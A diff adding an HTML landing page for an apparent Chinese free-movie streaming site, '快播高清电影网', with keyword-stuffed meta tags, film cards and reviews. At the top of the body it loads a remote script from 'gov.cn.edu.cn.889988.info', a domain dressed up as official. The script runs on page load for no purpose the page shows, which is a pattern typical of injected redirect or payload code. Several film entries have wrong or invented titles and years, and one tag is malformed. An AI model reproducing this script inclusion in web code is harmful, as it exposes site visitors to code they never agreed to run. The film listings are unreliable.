@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="applicable-device" content="pc,mobile">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>快播高清电影网 - 高清电影在线播放与最新影视资源免费观看平台</title>
+<meta name="keywords" content="快播高清电影网,kuaibogaoqingdianyingwang-zh.github.io,高清电影在线播放,免费看电影网站,最新电影资源下载,1080P高清影视,热门电影排行榜,经典老片重温">
+<meta name="description" content="快播高清电影网(kuaibogaoqingdianyingwang-zh.github.io)专注提供高清电影在线播放服务,涵盖1080P高清影视、最新院线大片、经典老片重温与热门电影排行榜,画质清晰、资源丰富、更新快速,是影迷追片的高清观影首选平台。">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{margin:0;font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif;color:#2b2b3a;line-height:1.7;background:#faf8ff}
+a{text-decoration:none;color:inherit}
+button{font-family:inherit;cursor:pointer;border:none;background:none}
+ul{list-style:none;margin:0;padding:0}
+:root{
+  --purple:#6d28d9;
+  --purple-d:#4c1d95;
+  --purple-l:#f3eeff;
+  --orange:#ff6b35;
+  --orange-l:#fff1e8;
+  --ink:#1e1b2e;
+  --grey:#7c7a8f;
+  --line:#ece8f5;
+  --white:#fff;
+  --rad:16px;
+}
+.wrap{max-width:1160px;margin:0 auto;padding:0 20px}
+
+/* promo */
+.promo{background:var(--ink);color:#fff;padding:9px 0;font-size:13px}
+.promo .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.promo b{color:var(--orange)}
+.promo em{font-style:normal;color:#a78bfa}
+
+/* header */
+.head{background:rgba(255,255,255,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:60}
+.head .wrap{display:flex;align-items:center;justify-content:space-between;height:74px;gap:18px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .orb{width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,var(--purple),var(--orange));display:grid;place-items:center;font-size:20px;color:#fff;box-shadow:0 4px 14px rgba(109,40,217,.35)}
+.logo h1{margin:0;font-size:22px;font-weight:900;color:var(--ink);letter-spacing:-.3px}
+.logo small{display:block;font-size:11px;color:var(--grey);font-weight:400;letter-spacing:2px;text-transform:uppercase}
+.menu{display:flex;gap:4px}
+.menu a{padding:9px 15px;border-radius:10px;font-size:15px;font-weight:600;color:#4b4863;transition:.2s}
+.menu a:hover{background:var(--purple-l);color:var(--purple)}
+.menu-btn{display:none;width:42px;height:42px;border-radius:12px;background:var(--purple-l);color:var(--purple);font-size:20px}
+
+/* hero */
+.hero{background:radial-gradient(circle at 15% 20%,#8b5cf6 0,transparent 42%),radial-gradient(circle at 85% 80%,#ff6b35 0,transparent 38%),linear-gradient(135deg,var(--purple-d),#3b0764);color:#fff;padding:64px 0 78px;position:relative;overflow:hidden}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center}
+.hero .pill{display:inline-block;background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.25);padding:6px 16px;border-radius:30px;font-size:13px;margin-bottom:18px}
+.hero h2{margin:0 0 16px;font-size:40px;font-weight:900;line-height:1.2}
+.hero h2 i{font-style:normal;background:linear-gradient(90deg,#ffb088,#ff6b35);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{margin:0 0 26px;font-size:16px;color:#e9d5ff;max-width:440px}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.bt{display:inline-flex;align-items:center;gap:7px;padding:14px 28px;border-radius:12px;font-weight:700;font-size:15px;transition:.2s}
+.bt-main{background:var(--orange);color:#fff;box-shadow:0 8px 22px rgba(255,107,53,.4)}
+.bt-main:hover{transform:translateY(-3px);background:#ff7f50}
+.bt-sub{background:rgba(255,255,255,.12);color:#fff;border:1px solid rgba(255,255,255,.25)}
+.bt-sub:hover{background:rgba(255,255,255,.22)}
+
+.hd-cards{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.hd-card{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.18);border-radius:16px;padding:18px;backdrop-filter:blur(4px);transition:.25s}
+.hd-card:hover{background:rgba(255,255,255,.18);transform:translateY(-4px)}
+.hd-card .big{font-size:30px;font-weight:900;color:var(--orange)}
+.hd-card h5{margin:8px 0 4px;font-size:15px}
+.hd-card p{margin:0;font-size:12.5px;color:#d8b4fe;line-height:1.5}
+
+/* layout */
+.tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:28px}
+.tab{padding:9px 20px;border-radius:30px;background:var(--white);border:1px solid var(--line);font-size:14.5px;font-weight:600;color:var(--grey);transition:.2s;box-shadow:0 2px 8px rgba(0,0,0,.03)}
+.tab:hover{border-color:#c4b5fd;color:var(--purple)}
+.tab.on{background:var(--purple);color:#fff;border-color:var(--purple)}
+.sec{padding:52px 0}
+.sec-head{display:flex;align-items:flex-end;gap:12px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h3{margin:0;font-size:24px;font-weight:900;color:var(--ink)}
+.sec-head .sub{font-size:13px;color:var(--grey);padding-bottom:3px}
+.sec-head a.all{margin-left:auto;font-size:13.5px;font-weight:700;color:var(--purple)}
+.sec-head a.all:hover{text-decoration:underline}
+
+/* film list */
+.films{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.film{background:var(--white);border-radius:var(--rad);overflow:hidden;box-shadow:0 3px 14px rgba(76,29,149,.07);transition:.25s;border:1px solid var(--line)}
+.film:hover{transform:translateY(-7px);box-shadow:0 16px 34px rgba(76,29,149,.16)}
+.film .thumb{position:relative;aspect-ratio:16/10;display:grid;place-items:center;font-size:40px;color:#fff;overflow:hidden}
+.film .thumb::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 55%,rgba(0,0,0,.35))}
+.film .thumb.t1{background:linear-gradient(135deg,#7c3aed,#a855f7)}
+.film .thumb.t2{background:linear-gradient(135deg,#ea580c,#fb923c)}
+.film .thumb.t3{background:linear-gradient(135deg,#2563eb,#38bdf8)}
+.film .thumb.t4{background:linear-gradient(135deg,#db2777,#f472b6)}
+.film .thumb.t5{background:linear-gradient(135deg,#059669,#34d399)}
+.film .thumb.t6{background:linear-gradient(135deg,#d97706,#fbbf24)}
+.film .thumb.t7{background:linear-gradient(135deg,#0891b2,#22d3ee)}
+.film .thumb.t8{background:linear-gradient(135deg,#be123c,#fb7185)}
+.film .thumb .res{position:absolute;top:10px;right:10px;z-index:2;background:rgba(0,0,0,.55);color:#ffd28a;font-size:11px;font-weight:800;padding:4px 9px;border-radius:6px;backdrop-filter:blur(3px)}
+.film .thumb .yr{position:absolute;bottom:10px;left:12px;z-index:2;font-size:12px;font-weight:600;text-shadow:0 1px 3px rgba(0,0,0,.5)}
+.film .info{padding:15px 16px}
+.film .info h4{margin:0 0 8px;font-size:16.5px;font-weight:800;color:var(--ink)}
+.film .info .meta{display:flex;gap:8px;flex-wrap:wrap}
+.film .info .meta span{font-size:11.5px;padding:3px 9px;border-radius:5px;background:var(--purple-l);color:var(--purple-d);font-weight:600}
+.film .info .meta span.o{background:var(--orange-l);color:#c2410c}
+
+/* schedule strip */
+.schedule{background:var(--white);border-radius:20px;padding:6px;display:flex;gap:6px;overflow-x:auto;margin-bottom:30px;box-shadow:0 3px 16px rgba(0,0,0,.04)}
+.schedule a{padding:12px 22px;border-radius:14px;font-size:14px;font-weight:600;color:var(--grey);white-space:nowrap;transition:.2s}
+.schedule a:hover{background:var(--purple-l);color:var(--purple)}
+.schedule a.cur{background:linear-gradient(135deg,var(--purple),#8b5cf6);color:#fff}
+
+/* reviews */
+.reviews{background:#f7f5fc;padding:52px 0}
+.rev-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+.rev{background:var(--white);border-radius:18px;padding:24px;border-top:4px solid var(--purple)}
+.rev:nth-child(2){border-top-color:var(--orange)}
+.rev:nth-child(3){border-top-color:#0891b2}
+.rev .stars{color:var(--orange);font-size:15px;letter-spacing:2px;margin-bottom:10px}
+.rev h5{margin:0 0 10px;font-size:16.5px;color:var(--ink)}
+.rev p{margin:0 0 14px;font-size:13.5px;color:var(--grey)}
+.rev .who{display:flex;align-items:center;gap:10px;font-size:12.5px;color:#a1a0ad}
+.rev .who .av{width:32px;height:32px;border-radius:50%;background:var(--purple-l);color:var(--purple-d);display:grid;place-items:center;font-weight:800;font-size:13px}
+
+/* timeline */
+.timeline{display:grid;grid-template-columns:repeat(4,1fr);gap:0;background:var(--white);border-radius:20px;overflow:hidden;box-shadow:0 3px 16px rgba(0,0,0,.04)}
+.tl{position:relative;padding:30px 22px;text-align:center;border-right:1px solid var(--line)}
+.tl:last-child{border:none}
+.tl .yr{font-size:13px;font-weight:800;color:var(--orange);margin-bottom:8px}
+.tl h6{margin:0 0 6px;font-size:15px;color:var(--ink)}
+.tl p{margin:0;font-size:12.5px;color:var(--grey)}
+
+/* guide */
+.guide{background:linear-gradient(135deg,#1e1b2e,#3b0764);color:#fff;padding:56px 0}
+.guide .sec-head h3{color:#fff}
+.guide .sub{color:#a78bfa}
+.guide-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.guide-item{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.14);border-radius:18px;padding:26px;display:flex;gap:18px;align-items:flex-start;transition:.25s}
+.guide-item:hover{background:rgba(255,255,255,.13)}
+.guide-item .num{font-size:34px;font-weight:900;color:var(--orange);line-height:1;flex:none}
+.guide-item h5{margin:0 0 8px;font-size:17px}
+.guide-item p{margin:0;font-size:13.5px;color:#c4b5fd}
+
+/* newsletter */
+.newsletter{background:var(--white);padding:52px 0;text-align:center}
+.newsletter h3{margin:0 0 10px;font-size:24px;color:var(--ink)}
+.newsletter p{margin:0 auto 24px;color:var(--grey);max-width:460px}
+.nl-form{display:flex;gap:10px;max-width:440px;margin:0 auto;flex-wrap:wrap}
+.nl-form input{flex:1;min-width:200px;padding:14px 18px;border:1.5px solid var(--line);border-radius:12px;font-size:15px;outline:none}
+.nl-form input:focus{border-color:var(--purple)}
+.nl-form button{padding:14px 28px;border-radius:12px;background:var(--purple);color:#fff;font-weight:700;font-size:15px;transition:.2s}
+.nl-form button:hover{background:var(--purple-d)}
+
+/* footer */
+.foot{background:#110e1f;color:#a1a0ad;padding:48px 0 22px}
+.foot .wrap{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:32px}
+.foot h6{margin:0 0 16px;color:#fff;font-size:15px}
+.foot ul li{margin-bottom:10px}
+.foot ul a{font-size:13.5px;color:#a1a0ad;transition:.2s}
+.foot ul a:hover{color:var(--orange)}
+.foot .brand-txt{font-size:13.5px;color:#7c7a8f;max-width:280px;margin-top:12px}
+.foot-bot{border-top:1px solid #241d3d;margin-top:34px;padding-top:20px;text-align:center;font-size:12.5px;color:#6d6b7d;line-height:2}
+
+@media(max-width:960px){
+  .hero .wrap{grid-template-columns:1fr;gap:32px;text-align:center}
+  .hero h2{font-size:30px}
+  .hero p{margin-left:auto;margin-right:auto}
+  .hero-btns{justify-content:center}
+  .hd-cards{grid-template-columns:1fr 1fr}
+  .films{grid-template-columns:repeat(2,1fr);gap:15px}
+  .rev-grid{grid-template-columns:1fr}
+  .guide-grid{grid-template-columns:1fr}
+  .timeline{grid-template-columns:1fr 1fr}
+  .tl{border-right:none;border-bottom:1px solid var(--line)}
+  .foot .wrap{grid-template-columns:1fr 1fr;gap:24px}
+  .menu{display:none;position:absolute;top:74px;left:0;right:0;background:#fff;flex-direction:column;padding:12px 16px;border-top:1px solid var(--line)}
+  .menu.open{display:flex}
+  .menu a{width:100%;padding:12px}
+  .menu-btn{display:block}
+  .head .wrap{height:66px}
+}
+@media(max-width:520px){
+  .wrap{padding:0 15px}
+  .hero{padding:42px 0 56px}
+  .hero h2{font-size:26px}
+  .sec{padding:38px 0}
+  .films{grid-template-columns:1fr 1fr}
+  .film .thumb{font-size:30px}
+  .film .info h4{font-size:15px}
+  .timeline{grid-template-columns:1fr}
+  .foot .wrap{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="promo">
+  <div class="wrap">
+    <span><b>🎬 每日精选：</b>高清画质 · 每日上新 · 海量片源一网打尽</span>
+    <span><em>立即收藏快播高清电影网，追剧看片不迷路</em></span>
+  </div>
+</div>
+
+<header class="head">
+  <div class="wrap">
+    <a href="#" class="logo">
+      <div class="orb">▶</div>
+      <div><h1>快播高清电影网</h1><small>HD Movie Hub</small></div>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#cinema">院线大片</a>
+      <a href="#classic">经典重温</a>
+      <a href="#review">影评推荐</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main>
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div>
+        <span class="pill">⚡ 1080P 高清 · 每日上新 · 海量片源</span>
+        <h2>每一帧都 <i>清晰震撼</i><br>沉浸式高清观影体验</h2>
+        <p>快播高清电影网专注高清电影在线播放，从院线大片到经典老片，覆盖多种类型与年代，让每一次播放都呈现影院级画质享受。</p>
+        <div class="hero-btns">
+          <a href="#cinema" class="bt bt-main">🎬 探索最新大片</a>
+          <a href="#classic" class="bt bt-sub">📽️ 经典片单</a>
+        </div>
+      </div>
+      <div class="hd-cards">
+        <div class="hd-card">
+          <div class="big">1080P</div>
+          <h5>全高清画质</h5>
+          <p>主流影片提供 1080P 高清片源，画面细节纤毫毕现</p>
+        </div>
+        <div class="hd-card">
+          <div class="big">4K</div>
+          <h5>精选超清</h5>
+          <p>热门大片支持 4K 超高清，大屏观影更震撼</p>
+        </div>
+        <div class="hd-card">
+          <div class="big">每日</div>
+          <h5>实时更新</h5>
+          <p>院线上映、网络首播内容第一时间上线</p>
+        </div>
+        <div class="hd-card">
+          <div class="big">50+</div>
+          <h5>类型标签</h5>
+          <p>动作、喜剧、爱情、科幻等全品类覆盖</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Cinema -->
+  <section class="sec" id="cinema">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="sub">In Theaters</span>
+        <h3>院线大片</h3>
+        <div class="schedule">
+          <a href="#" class="cur">本周热映</a>
+          <a href="#">即将上映</a>
+          <a href="#">票房榜单</a>
+          <a href="#">口碑佳作</a>
+        </div>
+        <a href="#" class="all">全部大片 ›</a>
+      </div>
+      <div class="tabs">
+        <a href="#" class="tab on">全部类型</a>
+        <a href="#" class="tab">动作冒险</a>
+        <a href="#" class="tab">科幻奇幻</a>
+        <a href="#" class="tab">剧情文艺</a>
+        <a href="#" class="tab">喜剧搞笑</a>
+        <a href="#" class="tab">悬疑犯罪</a>
+        <a href="#" class="tab">动画家庭</a>
+      </div>
+      <div class="films">
+        <article class="film">
+          <div class="thumb t1">🚀<span class="res">1080P</span><span class="yr">2026 · 美国</span></div>
+          <div class="info"><h4>星际远征：新纪元</h4><div class="meta"><span>科幻</span><span class="o">冒险</span><span>IMAX</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t2">🥋<span class="res">4K</span><span class="yr">2026 · 中国</span></div>
+          <div class="info"><h4>龙拳无敌</h4><div class="meta"><span>动作</span><span class="o">功夫</span><span>院线</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t4">💔<span class="res">1080P</span><span class="yr">2026 · 韩国</span></div>
+          <div class="info"><h4>最后的约定</h4><div class="meta"><span>爱情</span><span class="o">剧情</span><span>催泪</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t3">🕵️<span class="res">HD</span><span class="yr">2026 · 英国</span></div>
+          <div class="info"><h4>沉默的证人</h4><div class="meta"><span>悬疑</span><span class="o">犯罪</span><span>推理</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t8">🏰<span class="res">4K</span><span class="yr">2026 · 新西兰</span></div>
+          <div class="info"><h4>王国陨落</h4><div class="meta"><span>奇幻</span><span class="o">史诗</span><span>冒险</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t6">😂<span class="res">1080P</span><span class="yr">2026 · 中国</span></div>
+          <div class="info"><h4>一不小心爱上你</h4><div class="meta"><span>喜剧</span><span class="o">爱情</span><span>轻松</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t7">🌊<span class="res">HD</span><span class="yr">2026 · 美国</span></div>
+          <div class="info"><h4>深海禁区</h4><div class="meta"><span>灾难</span><span class="o">惊悚</span><span>视效</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t5">🎭<span class="res">1080P</span><span class="yr">2026 · 法国</span></div>
+          <div class="info"><h4>巴黎一夜</h4><div class="meta"><span>剧情</span><span class="o">文艺</span><span>获奖</span></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- Classic -->
+  <section class="sec" id="classic" style="background:#f7f5fc">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="sub">Classic Collection</span>
+        <h3>经典重温</h3>
+        <a href="#" class="all">经典片单 ›</a>
+      </div>
+      <div class="timeline">
+        <div class="tl"><div class="yr">2020s</div><h6>十年佳作</h6><p>近年口碑佳作持续沉淀</p></div>
+        <div class="tl"><div class="yr">2010s</div><h6>黄金年代</h6><p>类型片百花齐放的十年</p></div>
+        <div class="tl"><div class="yr">2000s</div><h6>千禧记忆</h6><p>一代人的集体观影记忆</p></div>
+        <div class="tl"><div class="yr">90s</div><h6>银幕经典</h6><p>影史公认的永恒经典</p></div>
+      </div>
+      <div class="films" style="margin-top:26px">
+        <article class="film">
+          <div class="thumb t1">🎬<span class="res">修复版</span><span class="yr">1994</span></div>
+          <div class="info"><h4>肖申克的救赎</h4><div class="meta"><span>剧情</span><span class="o">经典</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t4">🐎<span class="res">蓝光</span><span class="yr">2004</span></div>
+          <div class="info"><h4>骏马奔腾</h4><div class="meta"><span>传记</span><span class="o">励志</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t2">🔫<span class="res">1080P</span><span class="yr">2010</span></div>
+          <div class="info"><h4>暗夜追缉令</h4><div class="meta"><span>犯罪</span><span class="o">动作</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t3">🚀<span class="res">重制版</span><span class="yr">2014</span></div>
+          <div class="info"><h4>星际穿越</h4><div class="meta"><span>科幻</span><span class="o">烧脑</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t5">🌿<span class="res">高清</span><span class="yr">2016</span></div>
+          <div class="info"><h4>荒野猎人</h4><div class="meta"><span>冒险</span><span class="o">获奖</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t6">🎤<span class="res">蓝光</span><span class="yr">2018</span></div>
+          <div class="info"><h4>波西米亚狂想曲</span><div class="meta"><span>音乐</span><span class="o">传记</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t7">🐠<span class="res">1080P</span><span class="yr">2019</span></div>
+          <div class="info"><h4>海底总动员3</h4><div class="meta"><span>动画</span><span class="o">合家欢</span></div></div>
+        </article>
+        <article class="film">
+          <div class="thumb t8">🏆<span class="res">获奖</span><span class="yr">2020</span></div>
+          <div class="info"><h4>小丑</h4><div class="meta"><span>剧情</span><span class="o">犯罪</span></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- Reviews -->
+  <section class="reviews" id="review">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="sub">Editor's Pick</span>
+        <h3>影评推荐</h3>
+        <a href="#" class="all">更多影评 ›</a>
+      </div>
+      <div class="rev-grid">
+        <article class="rev">
+          <div class="stars">★★★★★</div>
+          <h5>2026 值得一看的十部高分新片</h5>
+          <p>从科幻巨制到文艺小品，盘点今年截至目前评分最高、讨论度最热的十部院线佳作，帮你排雷避坑。</p>
+          <div class="who"><span class="av">影</span>影评人 · 10月18日</div>
+        </article>
+        <article class="rev">
+          <div class="stars">★★★★☆</div>
+          <h5>国产动画的崛起：从追赶到超越</h5>
+          <p>近年来国产动画在技术与叙事上双双突破，本文梳理几部代表作品，看国漫如何实现口碑与票房双赢。</p>
+          <div class="who"><span class="av">漫</span>动漫观察 · 10月15日</div>
+        </article>
+        <article class="rev">
+          <div class="stars">★★★★★</div>
+          <h5>经典老片重映：大银幕的仪式感</h5>
+          <p>4K 修复让老片焕发新生，为什么越来越多的观众愿意为「看过的电影」再次走进影院？深度解读重映热潮。</p>
+          <div class="who"><span class="av">观</span>观影手记 · 10月12日</div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- Guide -->
+  <section class="guide" id="guide">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="sub">Watching Guide</span>
+        <h3>观影指南</h3>
+      </div>
+      <div class="guide-grid">
+        <div class="guide-item"><span class="num">01</span><div><h5>如何选择适合自己的影片</h5><p>从类型偏好、心情状态到观影场景，掌握快速筛选影片的小技巧，告别"不知道看什么"的纠结。</p></div></div>
+        <div class="guide-item"><span class="num">02</span><div><h5>高清画质怎么看才过瘾</h5><p>了解 1080P、4K、HDR 的区别与适用设备，充分发挥硬件性能，享受真正的影院级视觉体验。</p></div></div>
+        <div class="guide-item"><span class="num">03</span><div><h5>经典老片的正确打开方式</h5><p>优先选择修复版与蓝光资源，配合大屏设备观看，感受经典影片经时间沉淀后的独特魅力。</p></div></div>
+        <div class="guide-item"><span class="num">04</span><div><h5>追剧看片的日常小习惯</h5><p>善用片单收藏、关注更新提醒，把零散的观影时间利用起来，轻松养成规律的追片节奏。</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Newsletter -->
+  <section class="newsletter" id="about">
+    <div class="wrap">
+      <h3>📬 关注快播高清电影网</h3>
+      <p>本站聚焦高清电影在线播放与影视资讯分享，欢迎收藏本站，第一时间获取最新影片与片单推荐。</p>
+      <div class="nl-form">
+        <input type="text" placeholder="本站名称：快播高清电影网" readonly>
+        <button type="button">收藏本站</button>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div>
+      <h6>🎬 快播高清电影网</h6>
+      <div class="brand-txt">专注高清电影在线播放的影视资讯导航平台，提供院线大片、经典老片、影评推荐与观影指南，让每一帧画面都清晰震撼。</div>
+    </div>
+    <div>
+      <h6>热门分类</h6>
+      <ul>
+        <li><a href="#">动作大片</a></li>
+        <li><a href="#">喜剧电影</a></li>
+        <li><a href="#">科幻奇幻</a></li>
+        <li><a href="#">悬疑犯罪</a></li>
+        <li><a href="#">经典老片</a></li>
+      </ul>
+    </div>
+    <div>
+      <h6>精选内容</h6>
+      <ul>
+        <li><a href="#">院线热映</a></li>
+        <li><a href="#">即将上映</a></li>
+        <li><a href="#">票房榜单</a></li>
+        <li><a href="#">高分影评</a></li>
+        <li><a href="#">片单推荐</a></li>
+      </ul>
+    </div>
+    <div>
+      <h6>关于平台</h6>
+      <ul>
+        <li><a href="#about">平台简介</a></li>
+        <li><a href="#">观影指南</a></li>
+        <li><a href="#">版权声明</a></li>
+        <li><a href="#">联系我们</a></li>
+        <li><a href="#">意见反馈</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="wrap foot-bot">
+    © 2026 快播高清电影网 kuaibogaoqingdianyingwang-zh.github.io · 本站为影视资讯导航平台，所有影视信息仅供分享与参考，版权归原出品方所有<br>
+    如发现侵权内容请及时联系我们，我们将第一时间处理。
+  </div>
+</footer>
+
+<script>
+document.getElementById('menuBtn').addEventListener('click',function(){
+  document.getElementById('menu').classList.toggle('open');
+});
+document.querySelectorAll('.menu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open');});
+});
+document.querySelectorAll('.tab').forEach(function(t){
+  t.addEventListener('click',function(e){e.preventDefault();document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('on')});t.classList.add('on');});
+});
+</script>
+</body>
+</html>
